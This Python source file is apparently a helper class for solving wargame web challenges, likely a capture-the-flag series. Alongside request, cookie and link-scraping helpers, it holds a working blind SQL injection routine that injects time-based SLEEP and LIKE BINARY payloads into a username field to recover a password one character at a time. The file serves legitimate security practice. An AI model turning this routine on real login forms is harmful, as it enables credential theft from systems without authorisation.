import re

import requests
from requests.auth import HTTPBasicAuth

from . import Challenge


class ChallengeHTTP(Challenge):

    HTTP_USER = None        # Must be defined by subclass
    HTTP_URL = None         # Must be defined by subclass

    REQUESTS_TIMEOUT = 10            # in seconds

    BLIND_SQLI_SLEEP_DURATION = 2    # in seconds
    BLIND_SQLI_PASSWD_LENGTH_MAX = 64

    def __init__(self, *args, **kwargs):
        assert(self.HTTP_USER is not None)
        assert(self.HTTP_URL is not None)

        super().__init__(*args, **kwargs)

        self.auth = HTTPBasicAuth(self.http_user, self._passwd)
        self.challenge_url = self.HTTP_URL % (self._id)

    @property
    def http_user(self):
        return self.HTTP_USER % (self._id)

    @property
    def next_http_user(self):
        return self.HTTP_USER % (self._id + 1)

    def _wget(self, url, url_suffix=None, headers=None, data=None, files=None, cookies=None, **kwargs):
        if url_suffix is not None:
            url = '/'.join([url, url_suffix])

        if data is None and files is None:
            response = requests.get(url, auth=self.auth, headers=headers, cookies=cookies, timeout=self.REQUESTS_TIMEOUT, **kwargs)
        else:
            response = requests.post(url, auth=self.auth, headers=headers, data=data, files=files, cookies=cookies, timeout=self.REQUESTS_TIMEOUT, **kwargs)

        return response

    def wget(self, url=None, url_suffix='', headers=None, data=None, files=None, cookies=None, quiet=False, debug=False, **kwargs):
        if url is None:
            url = self.challenge_url
        url = '/'.join([url, url_suffix])

        if not quiet:
            self.log(f'    - wget: {url}')
            if headers is not None:
                self.log(f'      - Headers: {headers}')
            if data is not None:
                self.log(f'      - Data: {data}')
            if files is not None:
                try:
                    file_info = {k:v.getvalue() for k, v in files.items()}
                except AttributeError:
                    file_info = dict(files.items())
                self.log(f'      - Files: {file_info}')
            if cookies is not None:
                self.log(f'      - Cookies: {cookies}')

        r = self._wget(url, headers=headers, data=data, files=files, cookies=cookies, **kwargs)

        if debug:
            print('----- Debug -----')
            print('    - Debug Headers:\n', r.request.headers)
            try:
                print('    - Debug Body:\n', r.request.body.decode())
            except UnicodeDecodeError:
                print('    - Debug Body:\n', r.request.body)
            print('----- Debug -----')

        return r.text

    def submit(self, data, **kwargs):
        data['submit'] = 'Submit+Query'
        return self.wget(data=data, **kwargs)

    def get_cookies(self, url_suffix=''):
        url = '/'.join([self.challenge_url, url_suffix])
        session = requests.Session()
        r = session.get(url, auth=self.auth)
        return dict(session.cookies.get_dict())

    def get_robots(self):
        return self.wget(url_suffix='robots.txt')

    def get_links(self, get_relative_only=True, url_suffix=''):
        src = self.wget(url_suffix=url_suffix, quiet=True)

        links = set()
        for line in src.split('\n'):
            for found in re.findall(r'''<.*[src|href]\s*=\s*['"]([^'"]+)['"].*>''', line):
                links.add(found)

        if get_relative_only:
            links = [link for link in links if not link.startswith('http')]

        self.log(f'    - Get links: found {len(links)} links')

        return list(links)

    def get_arbo(self, get_relative_only=True, url_suffix=''):
        links = self.get_links(get_relative_only=get_relative_only, url_suffix=url_suffix)

        folders = set()
        for link in links:
            folder = re.search(r'(.*)/', link)
            if folder is not None:
                folders.add(folder.group(0))

        self.log(f'    - Get arborescence: found {len(folders)} folders')

        return list(folders)

    def blind_sqli(self, expected_output=None, data=None, **kwargs):
        if data is None:
            data = {}

        is_time_based = expected_output is None

        if is_time_based:
            mode = 'time based'
            sleep = f'and SLEEP({self.BLIND_SQLI_SLEEP_DURATION})'
        else:
            mode = 'expected based'
            sleep = ''
        self.log(f'    - Blind SQL Injection ({mode}):')

        def _response_is_true(response):
            if is_time_based:
                return response.elapsed.seconds >= self.BLIND_SQLI_SLEEP_DURATION
            else:
                return expected_output in response.text

        passwd_length = 0
        while passwd_length <= self.BLIND_SQLI_PASSWD_LENGTH_MAX:
            data['username'] = f'{self.next_http_user}" and LENGTH(password) > {passwd_length} {sleep} #'
            response = self._wget(self.challenge_url, data=data, **kwargs)

            if _response_is_true(response):
                passwd_length += 1
                self.log(f'      - Length: {passwd_length}', end='\r')
            else:
                break

        self.log(f'      - Length: {passwd_length}')

        available_chars = []
        for char in self.PASSWD_ALL_CHARS:
            data['username'] = f'{self.next_http_user}" and password LIKE BINARY "%{char}%" {sleep} #'
            response = self._wget(self.challenge_url, data=data, **kwargs)

            if _response_is_true(response):
                available_chars.append(char)
                self.log(f'      - Available chars: {"".join(available_chars)}', end='\r')

        self.log(f'      - Available chars: {"".join(available_chars)}')

        passwd = ''
        retry_count = 0
        while len(passwd) < passwd_length:
            old_passwd_length = len(passwd)

            for char in available_chars:
                data['username'] = f'{self.next_http_user}" and password LIKE BINARY "{passwd + char}%" {sleep} #'
                response = self._wget(self.challenge_url, data=data, **kwargs)

                if _response_is_true(response):
                    passwd += char
                    self.log(f'      - Password discovered is: {passwd}', end='\r')

            if len(passwd) == old_passwd_length:
                self.log(f'      - Password cannot be discovered ({passwd})')
                if retry_count < 5:
                    retry_count += 1
                    self.log(f'      - Retry (#{retry_count})')
                    passwd = ''
                else:
                    raise RuntimeError('Password cannot be discovered')

        self.log(f'      - Password discovered is: {passwd}')

        return passwd

    def process_challenge(self):
        raise NotImplementedError
